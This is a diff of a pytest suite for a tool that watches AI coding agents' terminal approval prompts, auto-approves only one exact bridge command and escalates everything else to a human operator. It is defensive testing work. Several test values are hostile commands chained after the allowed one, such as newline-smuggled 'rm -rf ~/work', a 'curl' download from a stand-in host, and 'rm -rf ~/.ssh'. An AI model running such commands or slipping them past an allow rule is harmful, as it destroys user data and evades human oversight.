@@ -6,6 +6,7 @@ import os
 import pty
 import select
 import signal
+import socket
 import subprocess
 import sys
 import tempfile
@@ -17,6 +18,7 @@ import pytest
 
 from agent_parley import (
     checkpoints,
+    decisions,
     dialogs,
     lanes,
     process,
@@ -70,6 +72,106 @@ CODEX_TRUST = (
     "of prompt injection.\r\n\r\n\x1b[1m› 1. Yes, continue\x1b[0m\r\n  2. "
     "No, quit\r\n\r\n  Press enter to continue\r\n"
 )
+
+CODEX_RUN = (
+    "\x1b[2J\x1b[H  Would you like to run the following command?\r\n\r\n"
+    "  $ python3 -P -m agent_parley.cli inbox\r\n\r\n\x1b[1m› 1. Yes, "
+    "proceed (y)\x1b[0m\r\n  2. Yes, and don't ask again for this command "
+    "in this session (a)\r\n  3. No, and tell Codex what to do differently "
+    "(esc)\r\n\r\n  Press enter to confirm or esc to cancel\r\n"
+)
+
+CODEX_EDITS = (
+    "\x1b[2J\x1b[H  Would you like to make the following edits?\r\n\r\n"
+    "  README.md (+1 -0)\r\n\r\n\x1b[1m› 1. Yes, proceed (y)\x1b[0m\r\n"
+    "  2. Yes, and don't ask again for these files (a)\r\n  3. No, and "
+    "tell Codex what to do differently (esc)\r\n\r\n  Press enter to "
+    "confirm or esc to cancel\r\n"
+)
+
+CODEX_GRANT = (
+    "\x1b[2J\x1b[H  Would you like to grant these permissions?\r\n\r\n"
+    "  network access\r\n\r\n\x1b[1m› 1. Yes, grant these permissions for "
+    "this turn (y)\x1b[0m\r\n  2. Yes, grant these permissions for this "
+    "session (a)\r\n  3. No, and tell Codex what to do differently (esc)"
+    "\r\n\r\n  Press enter to confirm or esc to cancel\r\n"
+)
+
+UNRECORDED_APPROVAL = (
+    "\x1b[2J\x1b[H  ⚠ Tool call held\r\n  $ rm -rf build\r\n"
+    "  [a] Approve   [d] Deny\r\n"
+)
+
+GEMINI_RUN = (
+    "\x1b[2J\x1b[H\x1b[38;2;249;226;175m╭──────────────────────────────────"
+    "──────────╮\r\n│ ?  Shell rm -rf build                       │\r\n│"
+    "                                            │\r\n│   rm -rf build    "
+    "                         │\r\n│                                       "
+    "     │\r\n│ Allow execution of [Shell]?                │\r\n│      "
+    "                                      │\r\n│ ● 1. Allow once         "
+    "                   │\r\n│   2. Allow for this session              "
+    "  │\r\n│   3. Allow this command for all future sessions │\r\n│   4."
+    " No, suggest changes (esc)               │\r\n╰──────────────────────"
+    "──────────────────────╯\x1b[0m\r\n"
+)
+
+GEMINI_EDIT = (
+    "\x1b[2J\x1b[H╭────────────────────────────────────────────╮\r\n│ ?"
+    "  WriteFile Writing to README.md          │\r\n│   1 + Install with "
+    "uv.                      │\r\n│ Apply this change?                    "
+    "     │\r\n│ ● 1. Allow once                            │\r\n│   2. "
+    "Allow for this session                 │\r\n│   3. Allow for this fi"
+    "le in all future sessions │\r\n│   4. Modify with external editor    "
+    "       │\r\n│   5. No, suggest changes (esc)               │\r\n╰────"
+    "────────────────────────────────────────╯\r\n"
+)
+
+COPILOT_RUN = (
+    "\x1b[2J\x1b[H ╭───────────────────────────────────────────────────────"
+    "──╮\r\n │ Run command                                             │\r\n"
+    " │ $ sed -i 's/old/new/' README.md                         │\r\n │ Do"
+    " you want to run this command?                          │\r\n │      "
+    "                                                   │\r\n │ ❯ 1. Yes   "
+    "                                             │\r\n │   2. Yes, and appr"
+    "ove `sed` for the rest of the running session │\r\n │   3. No, and tel"
+    "l Copilot what to do differently (Esc)       │\r\n ╰─────────────────"
+    "────────────────────────────────────────╯\r\n"
+)
+
+OPENCODE_PERMISSION = (
+    "\x1b[2J\x1b[H┃  \x1b[38;2;245;167;66m△\x1b[0m Permission required\r\n"
+    "┃  ← Bash  Remove the build directory\r\n┃\r\n┃  $ rm -rf build\r\n"
+    "┃\r\n┃  \x1b[48;2;250;178;131m Allow once \x1b[0m  Always allow   Reject"
+    "      ctrl+f fullscreen   ⇆ select   enter confirm\r\n"
+)
+
+AMP_APPROVAL = (
+    "\x1b[2J\x1b[H╭─ Approval Required ───────────────────────────────╮\r\n"
+    "│ Bash  rm -rf build                                │\r\n│           "
+    "                                        │\r\n│ ▸ Allow Once            "
+    "                          │\r\n│   Allow All for This Session         "
+    "             │\r\n│   Allow All for Every Session                     "
+    "│\r\n│   Reject with feedback                            │\r\n╰──────"
+    "─────────────────────────────────────────────╯\r\n"
+)
+
+AMP_GUARDED = (
+    "\x1b[2J\x1b[H╭─ Guarded File Modification ───────────────────────╮\r\n"
+    "│ edit_file  .github/workflows/check.yml            │\r\n│ ▸ Allow On"
+    "ce                                        │\r\n│   Always Allow This Pa"
+    "th                            │\r\n│   Reject                         "
+    "                 │\r\n╰───────────────────────────────────────────────"
+    "────╯\r\n"
+)
+
+APPROVALS = {
+    "claude": TOOL_PERMISSION,
+    "codex": CODEX_RUN,
+    "copilot": COPILOT_RUN,
+    "gemini": GEMINI_RUN,
+    "opencode": OPENCODE_PERMISSION,
+    "amp": AMP_APPROVAL,
+}
 
 CLAUDE_TRUST = (
     "\x1b[2J\x1b[H╭────╮\r\n│ Do you trust the files in this folder? │\r\n"
@@ -558,6 +660,101 @@ def test_an_attached_answer_waits_for_the_operator_to_finish_a_line():
             os.waitpid(pid, 0)
 
 
+def _reporter_harness(directory: Path, client: str) -> tuple[int, int]:
+    harness = (
+        "import os, sys\nfrom pathlib import Path\n"
+        "from agent_parley.terminal import run\n"
+        "raise SystemExit(run([sys.executable, '-c', sys.argv[2], "
+        "sys.argv[3]], "
+        "Path(sys.argv[1]), dict(os.environ), 'lane', attached=True))"
+    )
+    pid, master = pty.fork()
+    if pid == 0:
+        os.execvp(
+            sys.executable,
+            [
+                sys.executable,
+                "-c",
+                harness,
+                str(directory / "lane"),
+                client,
+                HOOK_REVIEW,
+            ],
+        )
+    return pid, master
+
+
+_REPORTER_CLIENT = (
+    "import os, sys, tty, time\ntty.setraw(0)\n"
+    "print('READY', flush=True)\n"
+    "os.read(0, 4096)\n"
+    "os.write(1, sys.argv[1].encode())\n"
+    "print('DRAWN', flush=True)\n"
+    "os.read(0, 4096)\n"
+    "os.write(1, b'\\x1b[?25l')\n"
+    "time.sleep(30)\n"
+)
+
+
+@pytest.mark.parametrize(
+    "report", [b"\x1b[O", b"\x1b[<35;12;7M", b"\x1b[24;80R"]
+)
+def test_a_mouse_or_cursor_report_does_not_answer_a_held_dialog(report):
+    with tempfile.TemporaryDirectory(prefix="dialog-") as temporary:
+        directory = Path(temporary)
+        (directory / "lane").mkdir()
+        project(directory, {})
+        write_json(
+            directory / "lane-activity.json",
+            {"activity": "idle", "updated": 1},
+        )
+        pid, master = _reporter_harness(directory, _REPORTER_CLIENT)
+        try:
+            marked(master, b"READY")
+            os.write(master, b"\x1b[I")
+            marked(master, b"DRAWN")
+            assert published(directory)["dialog"]["name"] == "hook-review"
+            os.write(master, report)
+            time.sleep(2.0)
+            state = json.loads((directory / "lane-activity.json").read_text())
+            assert "dialog" in state, state
+        finally:
+            os.kill(pid, signal.SIGKILL)
+            os.waitpid(pid, 0)
+
+
+@pytest.mark.parametrize("key", [b"1", b"\x1b", b"\x03"])
+def test_an_operator_digit_esc_or_interrupt_releases_a_held_dialog(key):
+    with tempfile.TemporaryDirectory(prefix="dialog-") as temporary:
+        directory = Path(temporary)
+        (directory / "lane").mkdir()
+        project(directory, {})
+        write_json(
+            directory / "lane-activity.json",
+            {"activity": "idle", "updated": 1},
+        )
+        pid, master = _reporter_harness(directory, _REPORTER_CLIENT)
+        try:
+            marked(master, b"READY")
+            os.write(master, b"\x1b[I")
+            marked(master, b"DRAWN")
+            assert published(directory)["dialog"]["name"] == "hook-review"
+            os.write(master, key)
+            deadline = time.monotonic() + 10
+            state = {}
+            while time.monotonic() < deadline:
+                state = json.loads(
+                    (directory / "lane-activity.json").read_text()
+                )
+                if "dialog" not in state:
+                    break
+                time.sleep(0.1)
+            assert "dialog" not in state, state
+        finally:
+            os.kill(pid, signal.SIGKILL)
+            os.waitpid(pid, 0)
+
+
 BRIDGE_TOOL = f"{protocol.TOOL_PREFIX}__fetch_inbox"
 
 
@@ -621,7 +818,8 @@ def test_status_names_the_prompt_and_how_long_it_has_waited(tmp_path):
     assert "; waiting 90s" in line
 
 
-BRIDGE_RULES = [protocol.TOOL_PREFIX, protocol.cli_rule()]
+BRIDGE_RULES = [protocol.TOOL_PREFIX, *protocol.cli_rules()]
+UNISOLATED_CLI = protocol.cli_command().replace(" -P ", " ")
 
 
 @pytest.mark.parametrize("scope", ["project", "lane"])
@@ -732,7 +930,7 @@ def test_the_question_picker_is_named_by_its_question(tmp_path, monkeypatch):
     monkeypatch.setattr(
         dialogs.Watch,
         "_notify",
-        lambda self, label, detail: sent.append((label, detail)),
+        lambda self, label, detail, decision="": sent.append((label, detail)),
     )
     screen = dialogs.flatten(QUESTION_PICKER.encode())
     found = dialogs.locate(screen)
@@ -914,21 +1112,31 @@ def test_a_release_that_meets_a_held_lock_is_retried(tmp_path):
     assert "dialog" not in state
 
 
-def _shell_prompt(command: str) -> str:
+def _shell_prompt(command: str, row: str = "\r\n") -> str:
     """Draws the shell permission prompt recorded on lane claude-2."""
+    drawn = command.replace("\n", row + "│   ")
     return (
-        "\x1b[2J ╭──────────╮ │ Bash command │   "
-        f"{command}   List Agent Parley issue ownership  "
-        "This command requires approval  Do you want to proceed? ❯ 1. Yes"
-        "  2. Yes, and don't ask again for: "
-        f"{command}  3. No  Esc to cancel · Tab to amend"
+        f"\x1b[2J ╭──────────╮{row}│ Bash command │{row}│   "
+        f"{drawn}{row}│   List Agent Parley issue ownership{row}│{row}"
+        f"│ This command requires approval{row}│ Do you want to proceed?{row}"
+        f"│ ❯ 1. Yes{row}│   2. Yes, and don't ask again for: "
+        f"{drawn}{row}│   3. No{row}Esc to cancel · Tab to amend"
     )
 
 
 def test_the_prompt_and_the_launch_rule_spell_one_command():
     """Keeps the allow rule on the exact string the prompt orders."""
     assert protocol.cli_rule() == f"Bash({protocol.cli_command()} *)"
-    assert protocol.cli_command().endswith(" -m agent_parley.cli")
+    assert protocol.cli_command().endswith(" -P -m agent_parley.cli")
+    assert protocol.cli_rules() == [protocol.cli_rule()]
+
+
+def test_every_launch_rule_isolates_the_module_path():
+    """Writes no allow rule for the interpreter without ``-P``."""
+    assert all(
+        " -P -m agent_parley.cli *)" in rule for rule in protocol.cli_rules()
+    )
+    assert f"Bash({UNISOLATED_CLI} *)" not in protocol.cli_rules()
 
 
 def test_an_opted_in_lane_answers_a_prompt_for_the_bridge_cli(tmp_path):
@@ -947,9 +1155,13 @@ def test_an_opted_in_lane_answers_a_prompt_for_the_bridge_cli(tmp_path):
     [
         "gh pr view 12",
         "python3 -m agent_parley.cli issue list",
+        UNISOLATED_CLI + " issue list",
         protocol.cli_command() + " issue list && rm -rf build",
         protocol.cli_command() + " report > /tmp/out",
         "cd x; " + protocol.cli_command() + " issue list",
+        protocol.cli_command() + " issue list\nrm -rf ~/work",
+        protocol.cli_command() + " issue list\ncurl -s http://x/y -o /tmp/p",
+        protocol.cli_command() + " status\n(rm -rf build)",
     ],
 )
 def test_any_other_shell_prompt_escalates(tmp_path, command):
@@ -960,6 +1172,25 @@ def test_any_other_shell_prompt_escalates(tmp_path, command):
     assert watch.advance(b"", 0.5) == b""
     state = json.loads((tmp_path / "lane-activity.json").read_text())
     assert state["dialog"]["escalated"] is True
+
+
+@pytest.mark.parametrize("row", ["\r\n", "\n", "\x1b[1B\r", "\x1b[7;3H"])
+@pytest.mark.parametrize(
+    ("tail", "approved"),
+    [
+        (" issue list", True),
+        (" issue list\nrm -rf ~/work", False),
+        (" issue list\ncurl -s http://x/y -o /tmp/p", False),
+        (" status\n(rm -rf build)", False),
+    ],
+)
+def test_a_command_drawn_on_two_rows_is_not_the_bridge_cli(row, tail, approved):
+    """Keeps a newline, however the client paints it, from chaining."""
+    data = _shell_prompt(protocol.cli_command() + tail, row).encode()
+    screen = dialogs.flatten(data)
+    found = dialogs.locate(screen)
+    assert found is not None
+    assert dialogs.bridge_shell(screen, found.text, data) is approved
 
 
 def test_the_opt_in_is_read_when_the_prompt_is_drawn(bridge, repo):
@@ -975,3 +1206,433 @@ def test_the_opt_in_is_read_when_the_prompt_is_drawn(bridge, repo):
     manifest["supervision"] = {dialogs.PRE_APPROVE: True}
     write_json(directory / "project.json", manifest)
     assert before.advance(b"", 1.0) == b"1\r"
+
+
+@pytest.fixture
+def delivered(monkeypatch):
+    """Captures the fields each native dialog notification carries."""
+    from agent_parley import notify
+
+    sent = []
+    monkeypatch.setattr(
+        notify,
+        "deliver",
+        lambda directory, agent, event, fields: sent.append(dict(fields)),
+    )
+    return sent
+
+
+def test_a_permission_prompt_is_answered_from_its_decision(tmp_path, delivered):
+    """Covers a prompt, its decision, a tap, the keystroke and the redraw."""
+    watch = dialogs.Watch(tmp_path, "lane")
+    assert watch.advance(TOOL_PERMISSION.encode(), 0.0) == b""
+    assert watch.advance(b"", 0.5) == b""
+    [record] = decisions.list_open(tmp_path)
+    assert record["kind"] == dialogs.DECISION_KIND
+    assert record["lane"] == "lane"
+    assert record["options"] == ["Yes", "No"]
+    assert record["recommended"] == "No"
+    assert [fields["decision"] for fields in delivered] == [record["id"]]
+    assert watch.advance(b"", 1.0) == b""
+    decisions.answer(tmp_path, record["id"], "Yes", "operator")
+    assert watch.advance(b"", 1.5, held=True) == b""
+    assert watch.advance(b"", 2.0) == b"1\r"
+    assert decisions.get(tmp_path, record["id"])["applied"]
+    state = json.loads((tmp_path / "lane-activity.json").read_text())
+    assert state["dialog"]["answered_by"] == "operator"
+    assert watch.advance(b"", 2.5) == b""
+    assert watch.advance(WORKING.encode(), 3.0) == b""
+    assert watch.holding is False
+
+
+def test_an_answer_to_a_screen_that_changed_is_never_pressed(
+    tmp_path, delivered
+):
+    """Retires the decision and asks afresh about the screen now drawn."""
+    watch = dialogs.Watch(tmp_path, "lane")
+    watch.advance(TOOL_PERMISSION.encode(), 0.0)
+    watch.advance(b"", 0.5)
+    [record] = decisions.list_open(tmp_path)
+    decisions.answer(tmp_path, record["id"], "Yes", "operator")
+    assert watch.advance(HOOK_REVIEW.encode(), 1.0) == b""
+    retired = decisions.get(tmp_path, record["id"])
+    assert retired["state"] == decisions.STALE
+    assert not retired.get("applied")
+    assert watch.advance(b"", 1.5) == b""
+    [fresh] = decisions.list_open(tmp_path)
+    assert fresh["id"] != record["id"]
+    assert "Review hooks" in fresh["options"]
+    with pytest.raises(BridgeError):
+        decisions.answer(tmp_path, record["id"], "No", "operator")
+
+
+def test_an_answer_the_screen_no_longer_offers_is_retired(tmp_path, delivered):
+    """Keeps a lane parked rather than pressing an option not drawn."""
+    watch = dialogs.Watch(tmp_path, "lane")
+    watch.advance(TOOL_PERMISSION.encode(), 0.0)
+    watch.advance(b"", 0.5)
+    [record] = decisions.list_open(tmp_path)
+    decisions.answer(tmp_path, record["id"], "Yes", "operator")
+    watch._tail = watch._tail.replace(b"1. Yes", b"1. Yeah")
+    assert watch.advance(b"", 1.0) == b""
+    assert decisions.get(tmp_path, record["id"])["state"] == decisions.STALE
+    assert watch.holding is True
+
+
+def test_a_launcher_that_exits_retires_its_open_decision(
+    tmp_path, delivered, monkeypatch
+):
+    """Refuses an answer once no launcher is left to press it."""
+    watch = dialogs.Watch(tmp_path, "lane")
+    watch.advance(TOOL_PERMISSION.encode(), 0.0)
+    watch.advance(b"", 0.5)
+    [record] = decisions.list_open(tmp_path)
+    monkeypatch.setattr(dialogs, "watcher", lambda directory, name: watch)
+    master, slave = os.openpty()
+    os.close(slave)
+    with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as listener:
+        terminal._session(
+            0,
+            master,
+            listener,
+            [signal.SIGTERM],
+            name="lane",
+            lane=tmp_path / "lane",
+            activity=tmp_path / "lane-activity.json",
+            ledger=tmp_path / "issues.json",
+            attached=False,
+            saved=None,
+            titling=False,
+            bounded=False,
+            inactive_after=60.0,
+            home=None,
+        )
+    retired = decisions.get(tmp_path, record["id"])
+    assert retired["state"] == decisions.STALE
+    with pytest.raises(BridgeError):
+        decisions.answer(tmp_path, record["id"], "Yes", "operator")
+
+
+def test_an_option_that_widens_a_permission_needs_confirming(
+    tmp_path, delivered
+):
+    """Holds "don't ask again" to the second answer an irreversible needs."""
+    watch = dialogs.Watch(tmp_path, "lane", bridge=False)
+    watch.advance(_shell_prompt("rm -rf build").encode(), 0.0)
+    watch.advance(b"", 0.5)
+    [record] = decisions.list_open(tmp_path)
+    yes, widening, refusing = record["options"]
+    assert widening.startswith("Yes, and don't ask again")
+    assert record["confirm"] == [widening]
+    assert record["recommended"] == refusing == "No"
+    assert decisions.confirming(record, widening) is True
+    assert decisions.confirming(record, yes) is False
+
+
+def test_a_question_decision_offers_the_picker_choices_only(
+    tmp_path, delivered
+):
+    """Leaves out the free-text option, since chat text is never typed."""
+    watch = dialogs.Watch(tmp_path, "lane")
+    watch.advance(QUESTION_PICKER.encode(), 0.0)
+    watch.advance(b"", 0.5)
+    [record] = decisions.list_open(tmp_path)
+    assert len(record["options"]) == 3
+    assert record["options"][2] == "Chat about this"
+    assert not any(
+        dialogs.FREE_TEXT in option.lower() for option in record["options"]
+    )
+    assert record["recommended"] == record["options"][0]
+    decisions.answer(tmp_path, record["id"], record["options"][1], "operator")
+    assert watch.advance(b"", 1.0) == b"2\r"
+
+
+def test_an_unreadable_prompt_is_named_terminal_only(tmp_path, delivered):
+    """Names the prompt no decision can answer rather than skipping it."""
+    watch = dialogs.Watch(tmp_path, "lane", deadline=1.0)
+    watch.advance(UNKNOWN_PROMPT.encode(), 0.0)
+    watch.advance(b"", 1.5)
+    assert decisions.list_open(tmp_path) == []
+    [fields] = delivered
+    assert "decision" not in fields
+    assert fields["detail"].startswith(dialogs.TERMINAL_ONLY)
+
+
+MISE_TRUST = (
+    "\x1b[2J ╭──────────╮\r\n│ Bash command │\r\n│   mise trust .\r\n"
+    "│   Trust the mise config so tools in this directory load?\r\n│\r\n"
+    "│ Do you want to proceed?\r\n│ ❯ 1. Yes\r\n│   2. Yes, and don't ask "
+    "again for mise trust commands in /home/operator/lane\r\n│   3. No\r\n"
+    "Esc to cancel · Tab to amend"
+)
+
+
+@pytest.mark.parametrize(
+    ("screen", "command"),
+    [
+        (MISE_TRUST, "mise trust ."),
+        (
+            "● Should the launcher trust a lane directory it did not create?"
+            "\r\n" + _shell_prompt("rm -rf build"),
+            "rm -rf build",
+        ),
+        (_shell_prompt("echo hooks need review"), "echo hooks need review"),
+    ],
+)
+def test_dialog_wording_around_a_permission_prompt_is_not_that_dialog(
+    tmp_path, delivered, screen, command
+):
+    """Never presses a trust or hook answer on a tool permission prompt."""
+    write_json(tmp_path / "lane-activity.json", {"activity": "working"})
+    answers = {"directory-trust": "Yes", "hook-review": "Trust all"}
+    watch = dialogs.Watch(tmp_path, "lane", answers, bridge=False)
+    found = dialogs.match(dialogs.flatten(screen.encode()))
+    assert found is not None
+    assert found.name == dialogs.PERMISSION
+    assert watch.advance(screen.encode(), 0.0) == b""
+    assert watch.advance(b"", 0.5) == b""
+    record = json.loads((tmp_path / "lane-activity.json").read_text())
+    record = record["dialog"]
+    assert record["name"] == dialogs.PERMISSION
+    assert dialogs.lane_cause(record) == lanes.APPROVAL
+    assert record["command"].startswith(command)
+    [decision] = decisions.list_open(tmp_path)
+    [widening] = decision["confirm"]
+    assert widening.startswith("Yes, and don't ask again")
+
+
+def test_a_decision_is_never_pressed_on_another_commands_prompt(
+    tmp_path, delivered
+):
+    """Retires an answer for one command when another command is drawn."""
+    prompt = " Do you want to proceed? ❯ 1. Yes 2. No Esc to cancel "
+    first = "  ls build " + prompt
+    second = "  rm -rf ~/.ssh " + prompt
+    watch = dialogs.Watch(tmp_path, "lane")
+    watch.advance(first.encode(), 0.0)
+    watch.advance(b"", 0.5)
+    [record] = decisions.list_open(tmp_path)
+    assert "ls build" in record["detail"]
+    decisions.answer(tmp_path, record["id"], "Yes", "operator")
+    assert watch.advance(second.encode(), 1.0) == b""
+    assert watch.advance(b"", 1.5) == b""
+    assert decisions.get(tmp_path, record["id"])["state"] == decisions.STALE
+    [fresh] = decisions.list_open(tmp_path)
+    assert "rm -rf ~/.ssh" in fresh["detail"]
+    assert "ls build" not in fresh["detail"]
+
+
+DRIFTED_PERMISSION = (
+    "  make test  Do you want to proceed? ❯ 1. Yes, and don't ask again for "
+    "make commands 2. No Esc to cancel "
+)
+
+
+def test_a_configured_answer_never_widens_a_permission_by_prefix(
+    tmp_path, delivered
+):
+    """Escalates when the only option the answer begins widens it."""
+    reordered = dialogs.flatten(
+        DRIFTED_PERMISSION.replace("2. No", "2. Yes, allow once 3. No").encode()
+    )
+    assert dialogs.keys(reordered, "Yes") == b"2\r"
+    screen = dialogs.flatten(DRIFTED_PERMISSION.encode())
+    assert dialogs.keys(screen, "Yes") == b""
+    assert dialogs.keys(screen, "Yes", allow_widening=True) == b"1\r"
+    exact = "Yes, and don't ask again for make commands"
+    assert dialogs.keys(screen, exact) == b"1\r"
+    watch = dialogs.Watch(tmp_path, "lane", {"tool-permission": "Yes"})
+    assert watch.advance(DRIFTED_PERMISSION.encode(), 0.0) == b""
+    assert watch.advance(b"", 0.5) == b""
+    [record] = decisions.list_open(tmp_path)
+    assert record["options"][0].startswith("Yes, and don't ask again")
+    state = json.loads((tmp_path / "lane-activity.json").read_text())
+    assert state["dialog"]["escalated"] is True
+
+
+@pytest.mark.parametrize(
+    ("capture", "answer", "command"),
+    [
+        (CODEX_RUN, "Yes, proceed", "$ python3 -P -m agent_parley.cli inbox"),
+        (CODEX_EDITS, "Yes, proceed", "README.md (+1 -0)"),
+        (
+            CODEX_GRANT,
+            "Yes, grant these permissions for this turn",
+            "network access",
+        ),
+    ],
+)
+def test_a_codex_approval_is_a_tool_permission_with_its_command(
+    tmp_path, delivered, capture, answer, command
+):
+    """Recognizes the Codex approvals and asks the operator about each."""
+    screen = dialogs.flatten(capture.encode())
+    assert dialogs.match(screen).name == dialogs.PERMISSION
+    assert dialogs.keys(screen, answer) == b"1\r"
+    watch = dialogs.Watch(tmp_path, "lane")
+    assert watch.advance(capture.encode(), 0.0) == b""
+    assert watch.advance(b"", 0.5) == b""
+    record = json.loads((tmp_path / "lane-activity.json").read_text())
+    record = record["dialog"]
+    assert record["name"] == dialogs.PERMISSION
+    assert record["command"] == command
+    assert dialogs.lane_cause(record) == lanes.APPROVAL
+    [decision] = decisions.list_open(tmp_path)
+    assert len(decision["options"]) == 3
+    assert decision["confirm"] == [decision["options"][1]]
+    assert decision["recommended"].startswith("No, and tell Codex")
+    assert command in decision["detail"]
+
+
+def test_a_configured_answer_is_pressed_on_a_codex_approval(tmp_path):
+    watch = dialogs.Watch(tmp_path, "lane", {"tool-permission": "Yes, proceed"})
+    assert watch.advance(CODEX_RUN.encode(), 0.0) == b""
+    assert watch.advance(b"", 0.5) == b"1\r"
+    state = json.loads((tmp_path / "lane-activity.json").read_text())
+    assert state["dialog"]["answer"] == "Yes, proceed"
+
+
+def test_a_silent_screen_after_a_tool_call_escalates_after_the_deadline(
+    tmp_path, delivered
+):
+    """Escalates wording nobody recorded once a tool call stays unanswered."""
+    write_json(
+        tmp_path / "lane-activity.json",
+        {"activity": "working", "event": "PreToolUse"},
+    )
+    screen = dialogs.flatten(UNRECORDED_APPROVAL.encode())
+    assert dialogs.match(screen) is None
+    assert dialogs.prompted(screen) is False
+    watch = dialogs.Watch(tmp_path, "lane", deadline=1.0)
+    assert watch.advance(UNRECORDED_APPROVAL.encode(), 0.0) == b""
+    assert watch.advance(b"", 0.5) == b""
+    assert watch.holding is False
+    assert watch.advance(b"", 1.6) == b""
+    assert watch.holding is True
+    state = json.loads((tmp_path / "lane-activity.json").read_text())
+    assert state["activity"] == dialogs.MARKER + dialogs.STALLED
+    assert state["dialog"]["name"] == "unknown"
+    assert dialogs.lane_cause(state["dialog"]) == lanes.PROMPT
+    [fields] = delivered
+    assert fields["detail"].startswith(dialogs.TERMINAL_ONLY)
+    assert "[a] Approve" in fields["detail"]
+
+
+def test_a_silent_screen_with_no_pending_tool_call_never_escalates(tmp_path):
+    write_json(
+        tmp_path / "lane-activity.json", {"activity": "idle", "event": "Stop"}
+    )
+    watch = dialogs.Watch(tmp_path, "lane", deadline=1.0)
+    for now in (0.0, 1.0, 40.0, 400.0):
+        output = UNRECORDED_APPROVAL.encode() if now == 0.0 else b""
+        assert watch.advance(output, now) == b""
+    assert watch.holding is False
+    state = json.loads((tmp_path / "lane-activity.json").read_text())
+    assert "dialog" not in state
+
+
+def test_every_provider_has_a_recorded_approval_fixture():
+    assert set(APPROVALS) == set(roster.ADAPTERS)
+    assert set(dialogs.RECORDED) == set(roster.ADAPTERS)
+
+
+@pytest.mark.parametrize(
+    "capture",
+    [*APPROVALS.values(), GEMINI_EDIT, AMP_GUARDED],
+    ids=[*APPROVALS, "gemini-edit", "amp-guarded"],
+)
+def test_a_recorded_approval_escalates_within_the_deadline(
+    tmp_path, delivered, capture
+):
+    """Escalates every provider's approval with no hook naming a tool."""
+    write_json(
+        tmp_path / "lane-activity.json", {"activity": "idle", "event": "Stop"}
+    )
+    screen = dialogs.flatten(capture.encode())
+    assert dialogs.match(screen) or dialogs.prompted(screen)
+    watch = dialogs.Watch(tmp_path, "lane", deadline=dialogs.ESCALATE_AFTER)
+    assert watch.advance(capture.encode(), 0.0) == b""
+    assert watch.advance(b"", 0.5) == b""
+    assert watch.advance(b"", dialogs.ESCALATE_AFTER + 0.5) == b""
+    assert watch.holding is True
+    state = json.loads((tmp_path / "lane-activity.json").read_text())
+    assert state["dialog"]["escalated"] is True
+    assert dialogs.lane_cause(state["dialog"]) in {lanes.APPROVAL, lanes.PROMPT}
+    assert delivered
+
+
+@pytest.mark.parametrize(
+    "capture",
+    [COPILOT_RUN, GEMINI_RUN, OPENCODE_PERMISSION, AMP_APPROVAL],
+    ids=["copilot", "gemini", "opencode", "amp"],
+)
+def test_another_providers_approval_is_never_answered(tmp_path, capture):
+    """Leaves a prompt without a recorded option list to the operator."""
+    watch = dialogs.Watch(
+        tmp_path, "lane", {dialogs.PERMISSION: "yes"}, deadline=1.0
+    )
+    for now in (0.0, 0.5, 1.5, 40.0):
+        output = capture.encode() if now == 0.0 else b""
+        assert watch.advance(output, now) == b""
+    state = json.loads((tmp_path / "lane-activity.json").read_text())
+    assert state["dialog"]["name"] == "unknown"
+    assert state["activity"] == "dialog: an unrecognized native prompt"
+
+
+def test_an_allow_once_mention_in_output_is_not_a_prompt():
+    screen = dialogs.flatten(
+        b"  \xe2\x8e\xbf  Documented that Gemini offers Allow once on each "
+        b"tool prompt. Read 4 files, ran 2 shell commands"
+    )
+    assert dialogs.prompted(screen) is False
+
+
+def test_a_published_dialog_names_the_client_version_that_drew_it(
+    tmp_path, delivered
+):
+    write_json(
+        tmp_path / "lane-activity.json",
+        {"activity": "working", "client_version": "codex-cli 0.153.4"},
+    )
+    watch = dialogs.Watch(tmp_path, "lane")
+    watch.advance(CODEX_RUN.encode(), 0.0)
+    watch.advance(b"", 0.5)
+    state = json.loads((tmp_path / "lane-activity.json").read_text())
+    assert state["dialog"]["client_version"] == "codex-cli 0.153.4"
+    [fields] = delivered
+    assert fields["detail"].endswith("drawn by codex-cli 0.153.4")
+
+
+def test_the_client_version_is_the_first_line_it_prints(tmp_path):
+    client = tmp_path / "client"
+    client.write_text("#!/bin/sh\necho 'codex-cli 0.153.4'\necho more\n")
+    client.chmod(0o755)
+    assert dialogs.version_of(str(client)) == "codex-cli 0.153.4"
+    failing = tmp_path / "failing"
+    failing.write_text("#!/bin/sh\necho 'unknown option'\nexit 2\n")
+    failing.chmod(0o755)
+    assert dialogs.version_of(str(failing)) == ""
+    assert dialogs.version_of(str(tmp_path / "missing")) == ""
+
+
+def test_drift_names_a_newer_client_and_an_unread_dialog(tmp_path):
+    seen = {
+        "newer": {"client": "claude", "client_version": "2.1.295 (Claude)"},
+        "unread": {
+            "client": "codex",
+            "client_version": "codex-cli 0.153.4",
+            "dialog": {"name": "unknown", "screen": ["Allow once  Reject"]},
+        },
+        "current": {"client": "claude", "client_version": "2.1.270"},
+        "untracked": {"client": "", "client_version": "9.0.0"},
+        "recorded": {"client": "gemini", "client_version": "0.64.0"},
+        "unversioned": {"client": "claude"},
+    }
+    for name, state in seen.items():
+        write_json(tmp_path / f"{name}-activity.json", state)
+    manifest = {"root": "/repo", "participants": dict.fromkeys(seen, {})}
+    assert dialogs.drift(tmp_path, manifest) == [
+        "/repo newer: claude 2.1.295 (Claude) is newer than the 2.1.270 the "
+        "dialog matchers were recorded from",
+        "/repo unread: codex drew an unrecognized prompt: Allow once  Reject",
+    ]
